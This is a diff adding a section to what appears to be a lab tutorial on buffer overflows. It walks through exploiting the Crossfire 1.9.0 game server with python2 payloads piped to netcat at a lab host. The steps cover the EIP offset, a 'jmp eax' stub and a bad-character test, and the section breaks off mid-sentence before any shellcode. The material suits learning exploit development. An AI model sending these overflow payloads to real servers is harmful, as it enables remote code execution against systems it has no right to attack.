@@ -700,3 +700,89 @@ If all working right, we should get reverse shell if we press on run again. Only
 **Figure 42** Reverse shell from vulnserver.
 
 So, now we have reverse shell directly from the vulnserver!
+
+We going on that linux buffer overflow, and now we going to go against crossfire binary file, which is part of the game crossfire, the file can be found on offensive security site on the following link: [crossfire](https://www.offensive-security.com/crossfire.tar.gz), then we decompress it using the following command `tar -zxvf crossfire.tar.gz`, also note the creossfire should be found under `/usr/games/`.
+
+After you have run crossfire from your linux you should see listener on port 13327 as follow
+```bash
+└─$ netstat -tunap
+(Not all processes could be identified, non-owned process info
+ will not be shown, you would have to be root to see it all.)
+Active Internet connections (servers and established)
+Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
+tcp        0      0 0.0.0.0:13327           0.0.0.0:*               LISTEN      24614/crossfire/bin
+```
+
+Then on the linux server side, run EDB and open crossfire from it, only then we can start and test the buffer overflow against it. Now, we can look for the exploit that used for crossfire 1.9.0, the [exploit](https://www.exploit-db.com/exploits/50216) contain buffer size of 4379 which what we going to use, also you can see that the buffer variable contain the following which look like essential for exploit crossfire: `\x11(setup sound " + overflow + "\x90\x00#`, so that is the string we going to use for our case. The following line of code is what I used against it.
+
+```bash
+python2 -c 'print "\x11(setup sound " + "\x41"*4379 + "\x90\x00#"'| nc -nv 192.168.126.36 13327
+```
+
+![bo-043.png](/assets/images/bo-043.png)
+**Figure 43** Overwrite the EIP on crossfire.
+
+You can see that this code overwrite the EIP with `\x41`, so now we going to use msf-pattern_create for create pattern and understand where the EIP are locate.
+```
+msf-pattern_create -l 4379
+```
+
+Run the code with the bunch of string that this msf-pattern give me, I can see the following on EDB at the crash point.
+
+![bo-044.png](/assets/images/bo-044.png)
+**Figure 44** Crossfire EIP overwrite.
+
+You can see that the EIP overwrite with 46367046, so running the following command find us the location of EIP.
+```
+└─$ msf-pattern_offset -l 4379 -q 46367046
+[*] Exact match at offset 4368
+```
+
+so now run the following to make the crash again and see if the `B` was overwrite on the EIP with `\x42`, and adding pattern of `C` for make it 4379.
+```bash
+└─$ python2 -c 'print "\x11(setup sound " + "\x41"*4368+"\x42"*4+"\x43"*7 + "\x90\x00#"'| nc -nv 192.168.126.36 13327
+(UNKNOWN) [192.168.126.36] 13327 (?) open
+#version 1023 1027 Crossfire Server
+
+
+```
+
+On the EDB I can see that it work, the EIP was overwrite with `B`.
+![bo-045.png](/assets/images/bo-045.png)
+**Figure 45** Crossfire EIP overwrite again.
+
+So now we can test and check if adding more pattern to the code will give us the same location of the EIP or it change, on my check it was change, if we follow the ESP it point to the last 7 `C` chars, but hte ECX are point back to out `A` but it look like we have little space because it follow the most end of the `A` location.
+
+The EAX register however point to the start of the input that was inserted, but that contain the "setup sound" string which we didn't want to change. So thinking of that case we have several options, one of them is to add more 12 of space to the EAX, that should change the location of EAX, since the the string "setup sound " is 12 chars only.
+
+Just think about it, if EAX is pointing to the memory location where the string "setup sound AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" is stored, and we add 12 to EAX, it would effectively move the pointer EAX forward by 12 bytes.
+
+So if EAX initially points to the start of the string "setup sound AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA", adding 12 to EAX would make it point to the 13th character of the string. Therefore, after adding 12 to EAX, it would point to the letter 'A' that comes after "setup sound ".
+
+```asm
+add eax, 12
+```
+
+After that done we need some way to jump to that EAX dump, so we can use `jmp eax`, for that case we need to use `msf-nasm_shell` for find the hex value we need to use.
+
+```
+└─$ msf-nasm_shell               
+nasm > add eax, 12
+00000000  83C00C            add eax,byte +0xc
+nasm > jmp eax
+00000000  FFE0              jmp eax
+nasm >
+```
+
+So, that all is only 5 chars, in that case we insert more 2 chars of `\x90` to the pattern so it's size remain 7 chars. Then we need to find our return address for jumo the ESP which contain that assembly code.
+
+```
+python2 -c 'print "\x11(setup sound " + "\x41"*4368+"\x42"*4+"\x83\xc0\x0c\xff\xe0\x90\x90" + "\x90\x00#"'| nc -nv 192.168.126.36 13327
+```
+
+I forgot that we must to check bad chars, so I came up with the following:
+```bash
+python2 -c 'print "\x11(setup sound " + "\x41"*4368+"\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff"+"\x42"*4+"\x83\xc0\x0c\xff\xe0\x90\x90" + "\x90\x00#"'| nc -nv 192.168.126.36 13327
+```
+
+That code should crash the server, the EIP will not overwrite with `B` but this is not matter, since we just need to check the bad chars, so we .
